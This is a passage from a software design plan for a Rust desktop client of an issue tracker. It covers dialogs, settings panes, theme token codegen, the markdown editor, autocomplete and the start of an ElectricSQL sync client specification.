server-managed (do not set it client-side).

**`RecurrenceEditor` widget** (mirror `components/recurrence-editor.tsx`): a first-due `Calendar` + an interval `Select` (values from the domain contract's `recurrenceIntervals`) + a unit `Select` (values from `recurrenceUnitValues`) + a stop/clear control. Reused by both the issue-detail recurrence control and the create-issue "Make recurring…" flow (below).

**`TimeInput` widget** (mirror `components/time-input.tsx`): a compact HH:MM input used for `due_time`/`end_time`; nulling it participates in the cascade-null rules above.

**Create-issue dialog** (`apps/web/src/components/create-issue-dialog.tsx`). A `Dialog` whose layout **matches web** (EXP-1 #6): borderless title `Input`, the markdown editor for description (with clipboard-image paste, §4.5 / EXP-1 #7), and a **chip row** of inline pickers (status/priority/assignee/labels/due-date — the due-date chip carries `due_time`/`end_time` per the due-date control above) along the bottom, plus a **"Create more" `Switch`** (web uses a `Switch`, not a checkbox — L488-494) and the submit `Button`. An **overflow-menu "Make recurring…"** item (mirror `create-issue-dialog.tsx` L344-398) swaps in a **recurring footer** (the `RecurrenceEditor`: first-due `Calendar` + interval/unit `Select`s + stop), which **forces status to `todo`** and **hides the due-date chip** while recurring; submit then carries `recurrence_interval`/`recurrence_unit`. On submit, `api.issues_create(...).await_synced(cx)`; if "Create more" is off, close and navigate to the new issue (gated). EXP-3's create-issue scroll fix and square date-picker are inherited by matching the current web layout — do not reintroduce the old shape.

**Create-project / Create-workspace dialogs** (`create-project-dialog.tsx`, `create-workspace-dialog.tsx`). Plain `Dialog`s. **Create-project** = name `Input` + an **auto-derived-but-editable prefix `Input`** (derived from name via `derivePrefix`, uppercased, `maxLength` 10) + a real **`ColorSwatchGrid`** (`@/components/ui/color-swatch-grid`) for project color — **there is no slug field** (slug is server-derived). **Create-workspace** = a single name `Input`. tRPC `api.projects_create` / `api.workspaces_create`.

**Settings** (`apps/web/src/components/workspace/` settings sections; route `.../settings/`). A settings shell with a left nav (`List`/`Tree`) and section panes:
- *General* — `Switch` (isPublic, publicWritePolicy via `Select`), name `Input`.
- *Members* (mirror `members-section.tsx`) — a `Table` of members with a role `DropdownMenu` (**Make owner / Make member** → `api.workspace_members_update_role`), **Remove member / Leave workspace** (`api.workspace_members_remove`), a **Generate invite link** action (`api.workspace_invites_create` → copy-to-clipboard invite `Input` + `Button`, `clipboard.rs`), and a **Pending-invites list with revoke** (`api.workspace_invites_revoke`).
- *Labels* — inline label rows, each with an inline color `Popover` (`ColorPicker`/`color_picker.rs`) and name `Input`; add/remove via `api.labels_*`.
- *Projects* (mirror `projects-section.tsx`) — project list + a per-project **Delete** (confirm dialog → `api.projects_delete`) + the **run-targets editor** (the DB `run_configs` UI — a `Table` of name/command/cwd rows; the CRUD + Trust gate is §07, this section places the settings pane).
- *Repositories* (mirror `repositories-section.tsx` `RepoRow`) — the GitHub **install banner** (correct connected/not-connected state — EXP-4: native falsely said "not installed"/"not connected"). GitHub-App **install** stays web-only (a "Manage/install on the web" hand-off link, §7.9), but the desktop pane can **connect + link** repos so Start coding is configurable on desktop: **add** a repo via `GithubRepoPicker` (`github-repo-picker.tsx`: a `Combobox`/searchable `List`) → `api.repositories_add`; **link/unlink** a repo to one-or-more projects → `api.repositories_link_project` / `api.repositories_unlink_project`; **set a per-project PRIMARY** (the Star — this is exactly what `repositories.forIssue` resolves as the Start-coding clone target, §7.1 step 1) → `api.repositories_set_primary`; and **remove** → `api.repositories_remove`. Repositories are server-only (never synced) — read/write via the `api` crate's tRPC calls, not a collection.
- *Danger Zone* (mirror `settings/index.tsx`) — a **Delete workspace** card: type-the-name-to-confirm dialog → `api.workspaces_delete`, gated **owner + non-public + team-only** (hidden for a solo/public workspace).

Plan-cap failures on invite / repo / project creation surface as the neutral **"Upgrade on the web"** `Notification` (§4.9), **not** an in-app upgrade dialog.

**Account** (`routes/_authenticated/account/integrations`, `.../notifications`). Integrations pane shows **GitHub only** (EXP-1 #9 — remove the stale Google Calendar entry that native still showed). Notifications pane = per-type email prefs via `Switch` + digest `Select` (mirrors `user_notification_prefs`, tRPC — server-only, not synced).

### 4.3 Theme: programmatic ThemeColor from generated tokens

The web forces dark (`html.dark`, zinc OKLCH). The desktop must be **byte-locked to the same design tokens**, not eyeballed. gpui-component's theme is `gpui_component::theme::ThemeColor`, a struct of ~50 `Hsla` fields whose names line up closely with shadcn (`background`, `foreground`, `primary`/`primary_foreground`/`primary_hover`/`primary_active`, `secondary*`, `muted`/`muted_foreground`, `accent`/`accent_foreground`, `border`, `ring`, `input`, `popover`/`popover_foreground`, the **`list`/`list_head`/`list_hover`/`list_active`** surfaces, `sidebar`/`sidebar_foreground`/`sidebar_accent`/`sidebar_border`/`sidebar_primary`, `danger*`) plus `radius: Pixels` on the parent `Theme` (confirmed against `crates/ui/src/theme/theme_color.rs` and `mod.rs`). **Note there is NO `card`/`card_foreground` field** — the struct has none (verified in `theme_color.rs`); web's card/list surface maps onto the real `list`/`list_head`/`secondary`/`background` tokens (see the EXP-1 #4 list-background note in §4.8). Do not reference a `card` token anywhere; a builder that sets `c.card = …` will not compile.

**Do not hand-author a `default-theme.json`.** gpui-component *can* load a JSON theme (`schema.rs`), but two facts make that a trap: (1) the web tokens are authored in `oklch(...)`, which the JSON color parser cannot read, and (2) there is no named "zinc" color in the JSON palette to reference. Both problems vanish if we **codegen the concrete color values** at build time and build `ThemeColor` in Rust.

The mechanism (LD-14, cross-referenced in §02/§03): `packages/design-tokens` gains a Rust emitter that resolves every shadcn token for the dark theme to a concrete sRGB byte triple and writes a **committed** `apps/desktop/crates/theme/src/tokens.generated.rs`:

```rust
// GENERATED by @exp/design-tokens — do not edit. Drift-guarded in CI (Phase 0 gate).
pub struct Srgb8 { pub r: u8, pub g: u8, pub b: u8 }
pub const BACKGROUND:        Srgb8 = Srgb8 { r: 0x09, g: 0x09, b: 0x0b }; // zinc-950
pub const FOREGROUND:        Srgb8 = Srgb8 { r: 0xfa, g: 0xfa, b: 0xfa };
pub const PRIMARY:           Srgb8 = Srgb8 { r: 0xfa, g: 0xfa, b: 0xfa };
pub const MUTED_FOREGROUND:  Srgb8 = Srgb8 { r: 0xa1, g: 0xa1, b: 0xaa }; // zinc-400
pub const BORDER:            Srgb8 = Srgb8 { r: 0x27, g: 0x27, b: 0x2a }; // zinc-800
// … every shadcn token, dark theme, resolved from OKLCH at generate time …
pub const RADIUS_PX: f32 = 5.0;
```

The theme crate then owns a hand-written `Srgb8 → gpui::Rgba → Hsla` converter and a builder that assembles the `ThemeColor` programmatically:

```rust
// apps/desktop/crates/theme/src/lib.rs
use gpui::{App, Hsla, Rgba};
use gpui_component::theme::{Theme, ThemeColor, ThemeMode, ThemeTokens};
use crate::tokens::generated as t;

fn hsla(c: t::Srgb8) -> Hsla {
    Rgba { r: c.r as f32 / 255., g: c.g as f32 / 255., b: c.b as f32 / 255., a: 1.0 }.into()
}

pub fn exponential_dark() -> ThemeColor {
    // ThemeColor::dark() returns Arc<Self>; ThemeColor is Copy, so deref-copy it.
    let mut c = *ThemeColor::dark(); // start from component defaults, then overwrite every token
    c.background = hsla(t::BACKGROUND);
    c.foreground = hsla(t::FOREGROUND);
    c.primary = hsla(t::PRIMARY);
    c.muted_foreground = hsla(t::MUTED_FOREGROUND);
    c.border = hsla(t::BORDER);
    c.sidebar = hsla(t::SIDEBAR);
    c.danger = hsla(t::DESTRUCTIVE);
    c.list = hsla(t::LIST);            // web's list/card surface → the real `list` token (no `card` field exists)
    c.list_head = hsla(t::LIST_HEAD); // group headers
    // … set EVERY field; leave none defaulted so the look is fully ours …
    c
}

// Applied by §3.6's shell AFTER Theme::change(Dark) (which reassigns colors AND tokens).
pub fn apply_exponential_dark(cx: &mut App) {
    let colors = exponential_dark();
    let theme = Theme::global_mut(cx);
    theme.mode = ThemeMode::Dark;
    theme.colors = colors;
    theme.tokens = ThemeTokens::from(&colors); // MUST rebuild tokens whenever colors change,
                                               // else half the widgets (which read theme.tokens) desync.
    // window.refresh() on the next frame / first window open picks up the new palette.
}
```

**Order is load-bearing (see §3.6).** `Theme::change(Dark)` → `apply_config` reassigns **both** `theme.colors` and `theme.tokens` from the stock dark `ThemeConfig`, so it must run **before** `apply_exponential_dark`, never after — otherwise it clobbers the Exponential palette back to stock. And because components read **both** `theme.colors` (via `Deref`) and `theme.tokens`, `tokens` must be rebuilt (`ThemeTokens::from(&colors)`) every time `colors` changes. The shell **forces dark permanently** — mirror `html.dark`, never observe or follow system appearance; never register an appearance observer. **Single source of truth = `@exp/design-tokens`.** A CI drift guard (Phase 0) re-runs the emitter and `git diff --exit-code`s `tokens.generated.rs`, so the desktop cannot silently diverge from web. **Open question:** the status/priority *accent* colors (green-500, yellow-500, red-500, orange-500, blue-500 from `domain.ts`) are Tailwind palette colors, not shadcn tokens — emit them into `tokens.generated.rs` as a small named set too (`GREEN_500`, …) and reference them from the `domain` crate's option table (§4.7), so those are token-locked as well rather than hard-coded hex in Rust.

### 4.4 Compact density (EXP-2f)

"Make the whole desktop UI more compact/smaller." There is no single scalar for this in gpui-component; density is the sum of several knobs, all set centrally so screens inherit it:

1. **Base font size** — set `Theme.font_size ≈ 13px` (web is 14px/`text-sm`; desktop goes one notch tighter). Applied on the global `Theme` at startup.
2. **Radius** — `RADIUS_PX = 5.0` (from tokens), vs web's larger default; keep `radius_lg` proportionally small.
3. **Component size default** — gpui-component components take a `Size` (`styled.rs`: `XSmall`=26px, `Small`=30px, `Medium` default). **Default interactive chrome (buttons, inputs, dropdowns, tabs) to `.small()`; use `.xsmall()` for inline row controls** (the status/priority dropdowns inside an issue row). Wrap this so every view does not repeat it: `ui/src/prelude.rs` exports helper constructors (`sm_button()`, `xs_icon_button()`, `sm_input(state)`) that pre-apply the size, and views use those.
4. **Row heights** — the issue-row grid mirrors web's `grid-cols-[1.5rem_4.5rem_1.5rem_1fr_auto_1.75rem_4.5rem]` (priority · identifier · status · title · labels · subscribe · due) but at a **denser row height (~28px vs web's ~36px)** and tighter vertical padding. The grid is expressed in the row element's Taffy layout (§4.6).
5. **Global spacing** — prefer `gap_1`/`gap_1p5` and `px_2` in list/detail chrome where web uses `gap-2`/`px-3`.

**Open question / later:** a thin wrapper crate that overrides gpui-component's `Size` px tables globally (26/30/36 → e.g. 22/26/30) would make density a one-line change, but forking those tables risks drift from upstream component internals. **Decision for v1:** do it with `font_size` + `radius` + per-call `.small()/.xsmall()` + explicit row heights (no fork). Revisit the wrapper only if the per-call approach proves too noisy in practice.

### 4.5 Hard interaction — the markdown editor (biggest item, own phase-gate)

This is the single largest UI item and gets its own sub-gate inside Phase 3. It is the desktop peer of the web TipTap editor and must honor the **GFM markdown interchange contract** (CLAUDE.md): `issues.description` and `comments.body` are plain-text GFM that round-trips byte-for-byte across web (TipTap + tiptap-markdown), iOS/macOS (cmark-gfm), and Android (from-scratch block editor). The desktop is now a **fourth implementation of that contract** and is bound by the same byte-parity test fixtures.

**What gpui-component gives us, and what it does not.** It ships `text::markdown(source)` — a **read-only** `TextView` markdown renderer (`crates/ui/src/text/`, confirmed: `markdown_ext.rs`, `text_view.rs::markdown`, headings/lists/links/code/inline styles) and an editable multi-line `InputState` (Tree-sitter `highlighter` for fenced code). Note `InputMode` is `pub(crate)` (`input/mode.rs`) and cannot be named from `apps/desktop`; the public surface is the builder methods on `InputState` — `.code_editor(language)`, `.multi_line(bool)`, `.auto_grow(min_rows, max_rows)`, `.line_number(bool)` (`input/state.rs`). It does **not** ship a rich WYSIWYG block editor. So:

- **v1 fallback (ship first, unblock everything downstream):** a two-part source editor — a multi-line `InputState` built via `InputState::new(window, cx).auto_grow(3, 20).code_editor("markdown")` holding the raw GFM source, with a live `text::markdown()` **preview** rendered beside/below it (a "write / preview" split, or preview-on-blur). This is correct-by-construction for round-trip (the buffer *is* the markdown) and lets §4.2 detail/create/comment flows land while the block editor is built. Fenced code blocks in the preview use the gpui-component `highlighter`.
- **v1 target (the real deliverable, Android-block-editor scale):** a **from-scratch gpui rich-text buffer** — an editable block model that renders formatted inline runs and derives GFM only at save, exactly as the iOS `IssueEditorModel`/`[ContentBlock]` and the Android `ui/markdown/` block editor do. Supported, round-trippable features (must match the contract exactly): **bold, italic, strikethrough, inline code; H1–H3 (editable); bullet + ordered lists; task lists `- [ ]`/`- [x]`; blockquote; links; fenced code (via the highlighter); block/full-width inline images; @mentions.** **Underline is intentionally unsupported** — no GFM representation, does not round-trip (do not add it even though it is trivially easy; the contract forbids it).

**Toolbar:** a **static toolbar** pinned above the editor (bold/italic/strike/code, H1–H3, bullet/ordered/task, quote, link, image) — **no selection-bubble / floating popover** (EXP-3 explicitly ditched the selection popover in the web markdown editor; the desktop inherits that decision).

**Links:** inserted/edited via an **inline `Popover` editor** (URL + text `Input`s), never a `window.prompt`-style modal.

**Images (one upload path for paste + drop + file-picker — EXP-1 #7):** all three entry points funnel through a single `upload_image(bytes, mime)` in the `api`/storage layer. Clipboard paste reads gpui's `ClipboardEntry::Image` (gpui exposes image clipboard entries; do not rely on text-only paste), drag-drop handles a file drop, and a toolbar image button opens a native file picker. Upload is atomic/all-or-nothing per the contract; on success insert the canonical **relative** form `![alt](/api/attachments/{id})` into the source (the server canonicalizes on save regardless; clients resolve to absolute only at fetch time). Embedded images render inline at their probed `width`/`height` (attachments carry dimensions) to avoid layout shift.

**Live `#IDENTIFIER` pills:** in both the editor's rendered view and read-only markdown, occurrences of `#EXP-123` are decorated as clickable pills resolved **live against the synced `issues` collection** — the decoration pass re-runs when the issues store changes (so a pill that could not resolve yet becomes clickable once its issue syncs), and clicking navigates to that issue's detail. Same treatment for `@email` mentions → render a known workspace member's `@email` as a **name pill** (resolved against the `users`/`workspace_members` collections), unresolved stays literal text. Authoring these is §4.6-style autocomplete below.

**Byte-parity gate:** the editor must round-trip the shared GFM fixtures (the same corpus the Android block editor is test-locked against — port those fixtures into `ui`/`domain` as a Rust test). Load a fixture's markdown → into the block model → back to markdown → assert byte-identical. This is a hard gate: the block editor is not "done" until it round-trips the fixtures. Until then, the v1 source+preview fallback is what ships, and it round-trips trivially.

### 4.6 Hard interaction — @email/#IDENT autocomplete + virtualized list with inline dropdowns

**The autocomplete popover (build early, reusable).** Both the markdown editor and the comment composer need a caret-anchored completion overlay: type `@` → member list (inserts the canonical `@email`), type `#` → issue list (inserts `#IDENTIFIER`). gpui-component's built-in `completion_menu` is LSP-bound and not reusable for this, so build a **standalone reusable overlay** in `ui/src/mention_popover.rs` early (Phase 3, before the editor consumes it):

- A floating element positioned at the caret pixel (from the editor element's layout), rendered into the `Root` overlay layer so it escapes clipping.
- Keyboard nav: ↑/↓ move selection, Enter/Tab accept, Esc dismiss; mouse hover also selects. Wire these as gpui key handlers on a focused handle the editor delegates to while a completion is open.
- Query sources are the synced collections: `@query` → `workspace_members` ⨝ `users` filtered by name/email prefix (insert `@<email>` — the single interchange form); `#query` → `issues` filtered by identifier/title prefix (insert `#<IDENTIFIER>`). Both re-query on each keystroke against the live store.
- The overlay is generic over an item type + a render closure so the same widget serves both `@` and `#` (and any future trigger).

Server-side, `@email` resolution to notifications/auto-subscribe is unchanged (`apps/web/src/lib/integrations/mentions.ts`) — the desktop only produces the `@email` source text; the server does the rest on save.

**Shared `IssuePicker` overlay** (mirror `components/issue-picker-dialog.tsx`). A `Dialog`/searchable list over the synced **`issues`** collection (filter by identifier/title, **exclude the current issue**), used by both the issue-detail header "Mark as duplicate…" action (§4.2) and the row `ContextMenu`'s "Mark as duplicate…" item. Selecting a canonical issue calls `api.issues_update({ duplicate_of_id })` (server sets `status='duplicate'` atomically); "Unmark duplicate" clears it.

**Virtualized issue list + inline dropdowns.** The board/My-Issues list can be long, so back it with gpui-component's `List` + a custom `ListDelegate` (`crates/ui/src/list/`, confirmed `trait ListDelegate` + `render_item`) or the lower-level `virtual_list.rs` for pure virtualization. Requirements:

- **Stable item IDs** — key each row by issue `id` (an `ElementId` derived from the UUID), so incremental Electric echoes re-render only changed rows and scroll position is preserved. (This also matters for the 409 refetch path — §05 keeps ids stable across a refetch; the list must not reset scroll on a shape re-adopt.)
- **Status-group sections** with `Collapsible` headers; empty groups hidden (web parity).
- **The grid row** lays out the `grid-cols-[1.5rem_4.5rem_1.5rem_1fr_auto_1.75rem_4.5rem]` columns via Taffy at compact height (§4.4): priority dropdown · identifier · status dropdown · title (truncating) · label `Tag`s · subscribe toggle · due `CalendarDays` + date (the due column shows the date, plus an optional `· HH:MM` when `due_time` is set).
- **Inline dropdowns that `stopPropagation` the row click.** The whole row navigates to detail on click; the priority/status/assignee/due controls are `DropdownMenu`/`Combobox`/`Popover` that must **not** trigger the row navigation when opened. In gpui, the row's click handler and the control's handler both run — so the control handlers call `cx.stop_propagation()` (the gpui equivalent of the web's `stopPropagation`) before opening, and the row's navigation handler checks it was not already handled. Get this exactly right; it is the #1 source of "clicking the status opened the issue" bugs.
- **Dropdowns are shadcn WITH icons (EXP-1 #5).** Every option row carries its `domain`-table icon + label + color (status circles, priority signal bars) — the native app's plain iconless menus were a specific complaint. Use gpui-component `menu`/`DropdownMenu` items with a leading `Icon`.

### 4.7 Port verbatim — `filters.ts` and `domain.ts`

Two web modules are the **shared cross-client contract** (already mirrored into iOS `Domain/IssueFilters.swift` and Android `domain/IssueFilters.kt`, with a comment in `filters.ts` demanding they stay in lockstep). The desktop is a fourth mirror. **Port them verbatim into the `domain` crate — do not re-derive.**

**`filters.ts` → `domain/src/filters.rs`:** `IssueFilters { statuses, priorities, label_ids }`, `EMPTY_FILTERS`, `TabPreset { All, Active, Backlog }`, `tab_preset_statuses` (`all: []`, `active: [in_progress, todo]`, `backlog: [backlog]`), `derive_active_tab(&[IssueStatus]) -> TabPreset`, `matches_filters(issue, &label_ids, &filters) -> bool`, `active_filter_count`, `has_active_filters`. Behavior byte-identical to the TS (the `active` set is `{in_progress, todo}` — memorize it; do not "fix" it). The `IssueFilterBar` `Tabs` and `matches_filters` in the board query (§4.1) call straight into these.

**`domain.ts` → `domain/src/options.rs`:** the status/priority option tables as one shared **icon + color + label** table. Values come from the generated `contract.generated.rs` (§02/§03 — the domain-contract Rust emitter); the *presentation* (icon name + color token + display label) is this table:

```rust
// domain/src/options.rs — mirror of apps/web/src/lib/domain.ts, do not re-derive
// Icon is built from OUR OWN icon_named! enum (ExpIcon), not gpui-component's IconName —
// see the icon note below. `Icon::from(ExpIcon::X)` works via the IconNamed → Icon blanket impl.
pub struct IssueOption<V> { pub value: V, pub label: &'static str, pub icon: Icon, pub color: Hsla }

pub fn issue_status_options() -> [IssueOption<IssueStatus>; 6] { [
    opt(Backlog,    "Backlog",     Icon::from(ExpIcon::CircleDashed), muted_foreground()),
    opt(Todo,       "Todo",        Icon::from(ExpIcon::Circle),       foreground()),
    opt(InProgress, "In Progress", Icon::from(ExpIcon::Timer),        t::YELLOW_500),
    opt(Done,       "Done",        Icon::from(ExpIcon::CircleCheck),  t::GREEN_500),
    opt(Cancelled,  "Cancelled",   Icon::from(ExpIcon::CircleX),      muted_foreground()),
    opt(Duplicate,  "Duplicate",   Icon::from(ExpIcon::Copy),         muted_foreground()),
] }

pub fn issue_priority_options() -> [IssueOption<IssuePriority>; 5] { [
    opt(None,   "No priority", Icon::from(ExpIcon::Minus),         muted_foreground()),
    opt(Urgent, "Urgent",      Icon::from(ExpIcon::TriangleAlert), t::RED_500),
    opt(High,   "High",        Icon::from(ExpIcon::SignalHigh),    t::ORANGE_500),
    opt(Medium, "Medium",      Icon::from(ExpIcon::SignalMedium),  t::YELLOW_500),
    opt(Low,    "Low",         Icon::from(ExpIcon::SignalLow),     t::BLUE_500),
] }
```

Also mirror `get_issue_status_config`/`get_issue_priority_config` (find-or-first-fallback). **Icon note (do NOT rely on gpui-component's `IconName`).** `IconName` is a fixed macro-generated enum over gpui-component's bundled 99-icon set (`icon_named!(IconName, "$GPUI_COMPONENT_DEFAULT_ICONS_DIR")` in `icon.rs`); several glyphs we need are **not** in it — verified missing: `circle`, `circle-dashed`, `timer`, `signal-high`, `signal-medium`, `signal-low` (only `circle-check`/`circle-x`/`circle-user` exist), and there is no `AlertTriangle` (the shipped file is `triangle-alert.svg` → `IconName::TriangleAlert`, *not* `AlertTriangle`). So: **ship all the needed Lucide SVGs into `apps/desktop/assets/icons/`** (`circle`, `circle-dashed`, `timer`, `signal-high/medium/low`, plus `circle-check`/`circle-x`/`copy`/`minus`/`triangle-alert` for a self-contained set) and generate a **project-local enum** with the same macro: `icon_named!(ExpIcon, "apps/desktop/assets/icons")`. Then `Icon::from(ExpIcon::CircleDashed)` is drop-in (the `IconNamed` trait + `impl<T: IconNamed> From<T> for Icon` in `icon.rs`). The SVG file names must line up with `domain.ts`'s glyph names so the mapping is one-to-one. The colors reference the token consts (§4.3 open question) so status/priority accents are token-locked, not loose hex. The `notification_type` icons (inbox) mirror the web inbox's per-type icons the same way (also via `ExpIcon`).

### 4.8 EXP-1 chrome punch-list

EXP-1 is thirteen sub-complaints that the native mac UI was not web-parity. All transfer to the new desktop and are gate items for Phase 3. Explicit checklist:

- **#1 Workspace picker** — a shadcn `DropdownMenu` in the sidebar top, not a native/ugly OS dropdown.
- **#2 New-project `+`** — lives on the **sidebar "Projects" group header**, not next to the workspace picker.
- **#3 Sidebar nav** — **My Issues + Inbox + Search** are first-class sidebar rows (were missing).
- **#4 / #12 Filter bar** — the All/Active/Backlog `Tabs` and the filter `Button` are styled **exactly** like web, and the **list background color is correct** (the real `list`/`list_head` surfaces, falling back to `secondary`/`background`, §4.3 — there is no `card` token; the native list had the wrong bg).
- **#5 Dropdowns** — all dropdowns are shadcn `DropdownMenu` **with icons** (status circles, priority bars, assignee avatars), not iconless native menus — applies to the issue-create dialog and everywhere else.
- **#6 Create-issue dialog** — layout matches web (§4.2).
- **#7 Clipboard image paste** — pasting an image into a new-issue description works (§4.5, one upload path).
- **#8 Sidebar not collapsible** — `SidebarCollapsible::None`.
- **#9 Integrations menu** — GitHub only; the stale **Google Calendar** entry is removed (Account → Integrations, §4.2).
- **#10 Feedback** — a **direct sidebar footer item** (not buried in a menu). **The browser path is PRIMARY for desktop v1:** the item opens the feedback project (`/feedback` → `projects/exponential`) in the system browser via the `api::opener` chain (§7.9). The embedded third-party JS widget (loader.js + shadow-root Preact) needs a host page and web-specific CSP/script-origin wiring that a bare gpui `webview` has no natural home for — so an in-app embedded widget is an **explicit desktop non-goal for v1** (a post-v1 door, not a build target). Placement (directly in the sidebar) is the requirement here; the mechanism is the browser hand-off.
- **#11 Settings** — lives in the **bottom user `DropdownMenu`** in the sidebar footer, not only the system menubar (a menubar entry may *also* exist via §03's `actions!`/keymap, but the primary affordance is the footer dropdown).
- **#13 Vanished issues/empty projects** — a sync bug, fixed by §05's engine (401→reauth, 409→atomic refetch, no URL-cache, sorted where) + §4.1's `is_ready` skeleton gating so an in-flight/empty snapshot never renders as "no data." This section's obligation is honoring `is_ready` everywhere; the root fix is §05.

**Solo-vs-team chrome rule** (`useShowWorkspaceChrome` from web): a `ui/src/queries.rs` helper `show_workspace_chrome(cx, user) -> bool` returns false until the user actually collaborates (is in a shared workspace with >1 member) or owns 2+ workspaces. While false, **hide** the workspace switcher, the workspace name header, and "New workspace" — a solo user sees a clean single-workspace shell. Mirror the web heuristic exactly.

### 4.9 Explicit UI non-goals (hold the line)

These web surfaces are **intentionally not built** on desktop — do not port them, and reject any drift toward them:

- **Billing** — the entire `components/workspace/billing` section, `PlanComparison`, any upgrade/purchase dialog, and all Creem UI. Billing is web-only and store-policy-safe. A plan-limit failure from a tRPC mutation (e.g. project/member cap) surfaces as a **neutral `Notification`/`Alert`: "Upgrade on the web"** with a link that opens `app.exponential.at` in the browser — **never** an in-app purchase or pricing UI.
- **Admin console** — the `routes/_authenticated/admin/*` surface is web-only.
- **Widget-settings management UI** — the workspace-settings "Feedback widget" config editor (public keys, domain allowlist) is web-only; the desktop only *uses* the widget via the Feedback footer item (EXP-1 #10), it does not manage configs.
- **Mobile chrome** — no mobile topbar, no hamburger, and **none of the `Sheet`-as-mobile-fallback branches**. Desktop always renders the non-mobile branch of every web component. `Sheet` is used only where the desktop genuinely wants a slide-in panel (e.g. a settings sub-pane), not as a small-screen substitute for a two-pane layout.

### 4.10 Phase-3 gate (the parity acceptance test)

Phase 3 is done when all of the following hold, checked side-by-side against the running web app at compact density:

1. **Pixel-diff** of board, issue-detail, sidebar, **and the login/auth screen** vs. web passes at compact density (same layout, same colors from the token codegen, same iconography; denser but structurally identical). The **login view presents the cloud/sign-in button first** (EXP-5).
2. **Markdown editor round-trips the GFM byte-parity fixtures** (block-editor sub-gate; the source+preview fallback ships until then).
3. **@mention + #ref autocomplete** work with full keyboard nav (↑↓/Enter/Tab/Esc) and insert the canonical `@email` / `#IDENTIFIER` forms; live `#IDENTIFIER`/`@email` pills resolve against the synced store and navigate.
4. **Image paste** inserts into the description and uploads through the single upload path (EXP-1 #7); drop + file-picker use the same path.
5. **Virtualized issue list** scrolls with stable IDs (no scroll reset on Electric echo or 409 refetch), and **inline dropdowns mutate via tRPC** and reflect the Electric echo (round-trip visible), with row-click vs. control-click propagation correct.
6. **EXP-1 chrome punch-list** (#1–#12, plus #13's `is_ready` gating) is visibly satisfied; the solo-vs-team chrome rule hides the switcher for a solo user.
7. `is_ready` skeletons show while syncing and never render an empty/in-flight snapshot as the real empty state.
8. **Recurrence create + edit + stop round-trip**: "Make recurring…" in the create dialog (forces `todo`, hides due-date) and the issue-detail recurrence `Popover` both write `recurrence_interval`/`recurrence_unit` (+ `due_date = first_due`), and "Stop recurring" clears both to null.
9. **Mark-as-duplicate** works from both the issue-detail header actions menu and the row context menu (shared `IssuePicker`, excludes self) and "Unmark" restores status; **comment edit/delete** are present and author-or-admin gated; the **due-date control carries `due_time`/`end_time`** with the cascade-null rules.


---

## 5. From-scratch Rust ElectricSQL sync client

The desktop app talks to the same 14 `/api/shapes/*` proxies as every other client — nothing on the server changes for it. What changes is the *implementation*: instead of `@electric-sql/client` (web), GRDB + `ShapeClient.swift` (iOS/macOS), or the Zig `electric/` module (Linux), we write a **from-scratch Rust sync client** in the `sync` crate, `gpui`-free at its core and validated 1:1 against the `packages/electric-protocol/fixtures/*.json` conformance vectors, plus the auth glue in the `api` crate.

This is a near-mechanical port of the proven `ExpCore/Sources/Electric/ShapeClient.swift` + `SyncManager.swift` (and the Zig `apps/linux/src/core/electric/`). Those two engines already ship in production and already encode every EXP-1 #13 gotcha; the Rust version must reproduce their behaviour exactly, not reinvent it. Where the Swift and Zig ports differ in taste (Swift maps in the entity initializer; Zig does a generic column upsert), **we follow the Zig-style generic column upsert** — it is more robust to partial updates and keeps the store layer table-agnostic.

The single source of protocol truth is `packages/electric-protocol/` (the README + the JSON fixtures). Read it before touching `protocol.rs`. The wire format is frozen and shared by all clients; the Rust client is a fourth consumer of the same contract, not a new dialect.

### 5.1 Crate layout and the gpui boundary

The `sync` crate is deliberately split so the entire protocol/store engine is **gpui-free** and unit-testable off the UI thread, with a thin `collections.rs` module as the only gpui-aware seam:

```
crates/sync/
├── Cargo.toml            # ureq, rustls, rusqlite (bundled+serde_json), serde, serde_json,
│                         # serde_with, serde_rusqlite (hydrate reads), flume, thiserror,
│                         # tracing — NO gpui here
├── src/
│   ├── lib.rs
│   ├── protocol.rs       # wire types + parse_messages() + key parsing + camel→snake — PURE, fixture-tested
│   ├── client.rs         # one long-poll loop per shape (ureq blocking); 401/409/must-refetch state machine
│   ├── store.rs          # rusqlite/WAL per-account SQLite; generic upsert/delete/refetch; hydrate reads
│   ├── shapes.rs         # the 14 ShapeSpec table entries (name, path, pk kind)
│   ├── manager.rs        # SyncManager: per-account pipeline reconcile from the signed-in set
│   └── collections.rs    # gpui glue: Entity<Collection<T>> per shape, delta drain, cx.notify  [gpui dep]
└── tests/
    └── protocol.rs       # loads packages/electric-protocol/fixtures/*.json, asserts 1:1
```

`Cargo.toml` puts `gpui` and `gpui-component` **only** behind `collections.rs` (feature-gate it if you prefer, but the simplest decision is: keep `collections.rs` in a submodule that the `app`/`ui` crates use, and let `tests/protocol.rs` depend only on the pure modules). The rule Fable must honour: **nothing in `protocol.rs`, `client.rs`, `store.rs`, `manager.rs`, or `shapes.rs` may `use gpui`.** They talk to the UI exclusively through a `flume::Sender<ShapeDelta>` handed in at construction.

Row structs and enums live in the `domain` crate (`crates/domain/src/`), generated from `@exp/domain-contract` (`contract.generated.rs`) plus hand-written row structs mirroring `packages/db-schema`. `sync` depends on `domain` for the typed hydration structs but stores/transports **raw strings** — see §5.5.

### 5.2 The protocol (`protocol.rs`) — pure, fixture-locked

Electric's shape protocol over the proxy is a long-poll GET. The client sends **only** `offset`, `handle`, `live`, and (belt-and-suspenders) `cursor`. It NEVER sends `where` or `columns` — the proxy pins both server-side (`createShapeRouteHandler` in `apps/web/src/lib/shape-route.ts`). This is not an optimisation; it is load-bearing:

- The proxy's `buildWhereClause` sorts id lists so the same id set yields byte-identical SQL (the where clause is part of Electric's shape identity; order flips rotate shape handles into 409 loops). By never sending `where` we **inherit the sorted-where stability fix for free** (EXP-1 #13 sub-point d).
- The `issue_subscribers` proxy pins a `columns` allowlist that EXCLUDES the reporter `email` column. By never sending `columns` we inherit the PII exclusion for free — the desktop store must **not even model** an `email` column on `issue_subscribers` (§5.4), or a future code path could leak it.

**Request shape.** Initial snapshot: `GET {base}/api/shapes/{table}?offset=-1`. Live loop: `GET {base}/api/shapes/{table}?offset={saved_offset}&handle={saved_handle}&live=true`. On every request set `Authorization: Bearer <session token>` and `Accept: application/json` (see §5.7 auth). Capture `electric-cursor` from the previous response and echo it as `?cursor={cursor}` when present — a redundant cache-buster on top of the server's `cache-control: private, no-store`.

**Response headers** `electric-handle` and `electric-offset` drive the *next* request; persist them only after a batch applies cleanly (§5.4). `electric-cursor` (when present) is stored transiently for the echo above.

**Body** is a JSON array of message objects:

```jsonc
[
